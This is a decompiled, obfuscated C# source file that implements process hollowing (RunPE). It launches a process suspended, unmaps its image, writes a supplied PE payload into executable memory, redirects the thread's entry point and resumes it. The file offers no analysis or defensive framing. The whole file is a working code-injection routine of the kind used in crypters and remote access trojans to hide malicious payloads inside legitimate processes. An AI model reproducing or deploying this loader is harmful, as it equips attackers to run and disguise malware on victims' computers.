using System;
using System.Runtime.InteropServices;

namespace ns415
{
	// Token: 0x0200031C RID: 796
	public static class GClass126
	{
		// Token: 0x060040F6 RID: 16630 RVA: 0x000F6D30 File Offset: 0x000F4F30
		internal unsafe static bool smethod_0(byte[] byte_0, string string_0, string string_1 = "")
		{
			GClass126.GStruct257 gstruct = default(GClass126.GStruct257);
			gstruct.uint_8 = 257U;
			gstruct.short_0 = 0;
			byte[] array = new byte[40];
			byte[] array2 = new byte[248];
			byte[] array3 = new byte[64];
			int[] array4 = new int[4];
			byte[] array5 = new byte[716];
			byte* ptr3;
			fixed (byte* ptr = &array[0])
			{
				byte* ptr2 = ptr;
				ptr3 = ptr2;
			}
			byte* ptr6;
			fixed (byte* ptr4 = &array2[0])
			{
				byte* ptr5 = ptr4;
				ptr6 = ptr5;
			}
			byte* ptr9;
			fixed (byte* ptr7 = &array3[0])
			{
				byte* ptr8 = ptr7;
				ptr9 = ptr8;
			}
			byte* ptr12;
			fixed (byte* ptr10 = &array5[0])
			{
				byte* ptr11 = ptr10;
				ptr12 = ptr11;
			}
			*(int*)ptr12 = 65543;
			Buffer.BlockCopy(byte_0, 0, array3, 0, array3.Length);
			bool result;
			if (*(ushort*)ptr9 != 23117)
			{
				result = false;
			}
			else
			{
				int num = *(int*)(ptr9 + 60);
				Buffer.BlockCopy(byte_0, num, array2, 0, array2.Length);
				if (*(uint*)ptr6 != 17744U)
				{
					result = false;
				}
				else
				{
					if (!string.IsNullOrEmpty(string_1))
					{
						string_0 = string_0 + " " + string_1;
					}
					if (!GClass126.CreateProcess(null, string_0, IntPtr.Zero, IntPtr.Zero, false, 4U, IntPtr.Zero, null, ref gstruct, array4))
					{
						result = false;
					}
					else
					{
						IntPtr intPtr = new IntPtr(*(int*)(ptr6 + 52));
						GClass126.NtUnmapViewOfSection((IntPtr)array4[0], intPtr);
						if (GClass126.VirtualAllocEx((IntPtr)array4[0], intPtr, *(uint*)(ptr6 + 80), 12288U, 64U) == IntPtr.Zero)
						{
							GClass126.smethod_0(byte_0, string_0, string_1);
						}
						fixed (byte* ptr13 = &byte_0[0])
						{
							byte* value = ptr13;
							GClass126.NtWriteVirtualMemory((IntPtr)array4[0], intPtr, (IntPtr)((void*)value), *(uint*)(ptr6 + 84), IntPtr.Zero);
						}
						for (ushort num2 = 0; num2 < *(ushort*)(ptr6 + 6); num2 += 1)
						{
							Buffer.BlockCopy(byte_0, num + array2.Length + array.Length * (int)num2, array, 0, array.Length);
							fixed (byte* ptr14 = &byte_0[(int)(*(uint*)(ptr3 + 20))])
							{
								byte* value2 = ptr14;
								GClass126.NtWriteVirtualMemory((IntPtr)array4[0], (IntPtr)((long)((int)intPtr) + (long)((ulong)(*(uint*)(ptr3 + 12)))), (IntPtr)((void*)value2), *(uint*)(ptr3 + 16), IntPtr.Zero);
							}
						}
						GClass126.NtGetContextThread((IntPtr)array4[1], (IntPtr)((void*)ptr12));
						GClass126.NtWriteVirtualMemory((IntPtr)array4[0], (IntPtr)((long)((ulong)(*(uint*)(ptr12 + 172)))), intPtr, 4U, IntPtr.Zero);
						*(int*)(ptr12 + 176) = (int)intPtr + (int)(*(uint*)(ptr6 + 40));
						GClass126.NtSetContextThread((IntPtr)array4[1], (IntPtr)((void*)ptr12));
						GClass126.NtResumeThread((IntPtr)array4[1], IntPtr.Zero);
						result = true;
					}
				}
			}
			return result;
		}

		// Token: 0x060040F7 RID: 16631
		[DllImport("ntdll.dll", SetLastError = true)]
		private static extern uint NtResumeThread(IntPtr intptr_0, IntPtr intptr_1);

		// Token: 0x060040F8 RID: 16632
		[DllImport("ntdll.dll", SetLastError = true)]
		private static extern int NtGetContextThread(IntPtr intptr_0, IntPtr intptr_1);

		// Token: 0x060040FA RID: 16634
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool CreateProcess(string string_0, string string_1, IntPtr intptr_0, IntPtr intptr_1, bool bool_0, uint uint_4, IntPtr intptr_2, string string_2, ref GClass126.GStruct257 gstruct257_0, int[] int_4);

		// Token: 0x060040FB RID: 16635
		[DllImport("ntdll.dll", SetLastError = true)]
		private static extern int NtWriteVirtualMemory(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, uint uint_4, IntPtr intptr_3);

		// Token: 0x060040FC RID: 16636
		[DllImport("ntdll.dll", SetLastError = true)]
		private static extern int NtSetContextThread(IntPtr intptr_0, IntPtr intptr_1);

		// Token: 0x060040FD RID: 16637
		[DllImport("ntdll.dll", SetLastError = true)]
		private static extern uint NtUnmapViewOfSection(IntPtr intptr_0, IntPtr intptr_1);

		// Token: 0x060040FE RID: 16638
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern IntPtr VirtualAllocEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_4, uint uint_5, uint uint_6);

		// Token: 0x0400193E RID: 6462
		private const uint uint_0 = 65543U;

		// Token: 0x0400193F RID: 6463
		private const int int_0 = 4;

		// Token: 0x04001940 RID: 6464
		private const int int_1 = 4096;

		// Token: 0x04001941 RID: 6465
		private const int int_2 = 8192;

		// Token: 0x04001942 RID: 6466
		private const int int_3 = 64;

		// Token: 0x04001943 RID: 6467
		private const ushort ushort_0 = 23117;

		// Token: 0x04001944 RID: 6468
		private const uint uint_1 = 17744U;

		// Token: 0x04001945 RID: 6469
		private const uint uint_2 = 256U;

		// Token: 0x04001946 RID: 6470
		private const uint uint_3 = 1U;

		// Token: 0x0200031D RID: 797
		public struct GStruct257
		{
			// Token: 0x04001947 RID: 6471
			public uint uint_0;

			// Token: 0x04001948 RID: 6472
			public string string_0;

			// Token: 0x04001949 RID: 6473
			public string string_1;

			// Token: 0x0400194A RID: 6474
			public string string_2;

			// Token: 0x0400194B RID: 6475
			public uint uint_1;

			// Token: 0x0400194C RID: 6476
			public uint uint_2;

			// Token: 0x0400194D RID: 6477
			public uint uint_3;

			// Token: 0x0400194E RID: 6478
			public uint uint_4;

			// Token: 0x0400194F RID: 6479
			public uint uint_5;

			// Token: 0x04001950 RID: 6480
			public uint uint_6;

			// Token: 0x04001951 RID: 6481
			public uint uint_7;

			// Token: 0x04001952 RID: 6482
			public uint uint_8;

			// Token: 0x04001953 RID: 6483
			public short short_0;

			// Token: 0x04001954 RID: 6484
			public short short_1;

			// Token: 0x04001955 RID: 6485
			public IntPtr intptr_0;

			// Token: 0x04001956 RID: 6486
			public IntPtr intptr_1;

			// Token: 0x04001957 RID: 6487
			public IntPtr intptr_2;

			// Token: 0x04001958 RID: 6488
			public IntPtr intptr_3;
		}
	}
}
